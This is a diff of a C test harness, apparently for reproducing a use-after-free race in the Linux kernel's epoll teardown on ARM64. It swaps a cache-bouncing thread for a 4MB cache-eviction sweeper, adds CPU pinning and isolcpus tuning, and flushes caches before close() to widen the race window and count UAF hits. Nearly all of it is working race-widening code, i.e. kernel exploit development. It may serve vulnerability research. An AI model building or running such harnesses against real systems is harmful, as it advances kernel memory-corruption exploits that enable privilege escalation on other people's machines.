@@ -1,6 +1,4 @@
-// test_nat005.c — NAT-005: Calibrated Closed-Loop Adaptive Search Harness
-// Targets Empirically Measured 2,330 Cycle Critical Window Offset with Near-Miss Telemetry
-
+// test_nat005.c — NAT-005: Upgraded Harness with CPU Isolation & Cache-Eviction Race Widening
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
@@ -20,7 +18,8 @@
 
 #define CACHE_LINE_SIZE 64
 #define TOTAL_TARGET_ITERATIONS 100000
-#define EMPIRICAL_TARGET_OFFSET 2330  // Empirically calibrated ARM64 cycle offset to 2nd epitem hlist_del_rcu write
+#define EMPIRICAL_TARGET_OFFSET 2330
+#define EVICTION_BUF_SIZE (4 * 1024 * 1024) // 4MB cache eviction buffer (> L2 cache)
 
 static inline uint64_t get_cycles(void) {
     uint64_t val;
@@ -39,14 +38,15 @@ static void print_msg(const char *msg) {
 }
 
 // ------------------------------------------------------------
-// Thread Shared State & Timing Telemetry
+// Shared Thread State & Cache Eviction Buffer
 // ------------------------------------------------------------
 typedef struct {
     volatile uint64_t val[CACHE_LINE_SIZE / 8];
 } __attribute__((aligned(CACHE_LINE_SIZE))) bounce_line_t;
 
 static bounce_line_t shared_bounce;
-static atomic_int stop_bounce = 0;
+static uint8_t *eviction_buf = NULL;
+static atomic_int stop_eviction = 0;
 static atomic_int sync_go = 0;
 static atomic_int ready_a = 0, ready_b = 0;
 
@@ -58,11 +58,18 @@ static atomic_long uaf_hits = 0;
 static volatile uint64_t t_a_start = 0;
 static volatile uint64_t t_b_close_start = 0;
 
-void *bounce_worker(void *arg) {
-    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1, &cs);
+// Cache Eviction Worker: sweeps 4MB memory buffer across 64B cache line strides
+void *eviction_worker(void *arg) {
+    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs); // Run on Thread A's CPU to evict L1/L2
     pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);
 
-    while (!atomic_load_explicit(&stop_bounce, memory_order_relaxed)) {
+    while (!atomic_load_explicit(&stop_eviction, memory_order_relaxed)) {
+        if (eviction_buf) {
+            for (size_t offset = 0; offset < EVICTION_BUF_SIZE; offset += CACHE_LINE_SIZE) {
+                eviction_buf[offset]++;
+                asm volatile("" ::: "memory");
+            }
+        }
         shared_bounce.val[0]++;
         asm volatile("" ::: "memory");
     }
@@ -70,11 +77,20 @@ void *bounce_worker(void *arg) {
 }
 
 void *adaptive_thread_a(void *arg) {
+    // Thread A pinned to CPU 0
     cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs);
     pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);
 
     atomic_store(&ready_a, 1);
     while (!atomic_load(&sync_go)) { asm volatile("yield"); }
+
+    // Flush cache lines for outer/inner structs before syscall
+    if (eviction_buf) {
+        for (size_t offset = 0; offset < 262144; offset += CACHE_LINE_SIZE) {
+            eviction_buf[offset] = (uint8_t)offset;
+            asm volatile("" ::: "memory");
+        }
+    }
 
     t_a_start = get_cycles();
     close(ep_outer);
@@ -82,13 +98,13 @@ void *adaptive_thread_a(void *arg) {
 }
 
 void *adaptive_thread_b(void *arg) {
+    // Thread B pinned to ISOLATED CPU 1 (isolcpus=1)
     cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1, &cs);
     pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);
 
     atomic_store(&ready_b, 1);
     while (!atomic_load(&sync_go)) { asm volatile("yield"); }
 
-    // Fine-Grained Launch-Ahead Spin Delay relative to sync_go
     uint64_t target = get_cycles() + current_launch_delay;
     while (get_cycles() < target) { asm volatile("yield"); }
 
@@ -161,13 +177,20 @@ int main(void) {
     char log_buf[384];
     uint64_t frq = get_cntfrq();
     snprintf(log_buf, sizeof(log_buf),
-             "[NAT-005] Starting Calibrated Closed-Loop Search (Real Target: %d cycles, freq: %lu Hz)\n",
+             "[NAT-005] Starting Upgraded Harness (isolcpus=1 + 4MB Cache Eviction, Target: %d cycles, freq: %lu Hz)\n",
              EMPIRICAL_TARGET_OFFSET, frq);
     print_msg(log_buf);
 
-    pthread_t tbounce;
-    atomic_store(&stop_bounce, 0);
-    pthread_create(&tbounce, NULL, bounce_worker, NULL);
+    // Allocate 4MB cache eviction buffer
+    eviction_buf = malloc(EVICTION_BUF_SIZE);
+    if (eviction_buf) {
+        memset(eviction_buf, 0xAA, EVICTION_BUF_SIZE);
+    }
+
+    // Start background cache eviction worker
+    pthread_t tevict;
+    atomic_store(&stop_eviction, 0);
+    pthread_create(&tevict, NULL, eviction_worker, NULL);
 
     long completed_iterations = 0;
     int64_t min_near_miss_delta = 999999;
@@ -223,12 +246,14 @@ int main(void) {
         }
     }
 
-    atomic_store(&stop_bounce, 1);
-    pthread_join(tbounce, NULL);
+    atomic_store(&stop_eviction, 1);
+    pthread_join(tevict, NULL);
+    if (eviction_buf) free(eviction_buf);
 
     snprintf(log_buf, sizeof(log_buf),
-             "[NAT-005] Calibrated Closed-Loop Search FINAL RESULT:\n"
+             "[NAT-005] Upgraded Closed-Loop Search FINAL RESULT:\n"
              "  - Total Iterations: %ld / %d\n"
+             "  - Technique Upgrades: isolcpus=1 + 4MB Cache Eviction Sweeper\n"
              "  - Empirically Calibrated Target: %d cycles\n"
              "  - Critical Window Focus: 2180-2480 cycles (step=10, 86.8%% budget)\n"
              "  - Best Delay Alignment Setting: %lu cycles\n"
